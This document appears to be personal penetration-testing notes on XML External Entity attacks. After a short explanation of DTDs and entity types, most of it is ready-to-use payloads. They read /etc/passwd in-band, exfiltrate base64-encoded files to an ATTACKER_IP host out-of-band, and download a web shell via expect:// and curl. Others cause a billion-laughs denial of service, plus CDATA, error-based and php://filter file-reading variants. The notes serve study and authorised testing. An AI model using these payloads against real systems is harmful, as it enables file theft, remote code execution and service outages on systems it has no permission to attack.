
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

##### JSON to XML:
https://www.convertjson.com/json-to-xml.htm
### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.

Purpose and usage of DTDs:

- **Validation**: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
- **Entity Declaration**: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

### XML Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```
### Types of Entities
1. Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:

```xml
<!DOCTYPE note [
<!ENTITY inf "This is a test.">
]>
<note>
        <info>&inf;</info>
</note>
```
2. -External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```
    
    Here, `&ext;` pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
3.  Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```
    
    In this case, `%common;` is used within the DTD to define the type of data that the `name` element should contain.
4. General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```
    
    The entity `&author;` is a general entity used to substitute the author's name wherever it's referenced in the document.
5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:
    
    - `&lt;` for the less-than symbol (`<`)
    - `&gt;` for the greater-than symbol (`>`)
    - `&amp;` for the ampersand (`&`)
    
    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```
    
    This usage ensures that the special characters are processed correctly by the XML parser without breaking the document's structure.

#### File inclusion
```
php://filter/convert.base64-encode/resource=connection.php
```

### In-Band XXE Exploitation
Sending this request data:
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```
### Out-Of-Band XXE
1. Upload malicious XNL:
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```
1. Start a web server and access the XML on attacked site


##### RCE

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

#### DDOS
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```


#### CDATA

CDATA is raw content, e.g.
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

exploit:
```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
python -m http.server 8888
```
Send:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8888/XXE.dtd">
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

#### Error based

Just broke a tag or local file path:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
or
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```